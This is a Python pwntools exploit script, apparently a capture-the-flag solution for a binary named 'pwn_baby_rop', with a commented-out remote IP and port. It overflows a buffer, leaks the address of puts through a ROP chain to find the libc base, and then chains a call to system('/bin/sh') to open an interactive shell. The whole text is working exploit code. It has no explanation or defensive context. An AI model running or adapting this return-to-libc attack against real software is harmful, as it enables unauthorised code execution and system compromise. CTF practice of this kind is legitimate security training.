from pwn import *

# found address of puts: 0x7f068e9855f0

IP = "35.234.100.160"
port = 30741
context.arch = 'amd64'

binary = ELF("./pwn_baby_rop")
p = binary.process()
# p = remote(IP, port)

main = 0x4015e3

rop = ROP(binary)
rop.call(binary.symbols["puts"], [binary.got['puts']])
rop.call(p64(main))

offset = 264 * b"A"

payload = [
    offset,
    rop.chain()
]


payload = b"".join(payload)

p.recvuntil("Solve this challenge to prove your understanding to black magic.\n")
p.sendline(payload)

puts = u64(p.recvuntil("\n").rstrip().ljust(8, b'\x00'))
log.info(f"puts addr found at {hex(puts)}")

libc = ELF("libc6_2.31-0ubuntu9.1_amd64.so")
libc.address = puts - libc.symbols["puts"]
log.info(f"libc base address: {hex(libc.address)}")
rop_libc = ROP(libc)

rop_libc.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\x00"))])
rop_libc.call(libc.symbols["exit"])

new_payload = [
    offset,
    rop_libc.chain()
]

new_payload = b"".join(new_payload)

p.sendline(new_payload)

p.interactive()
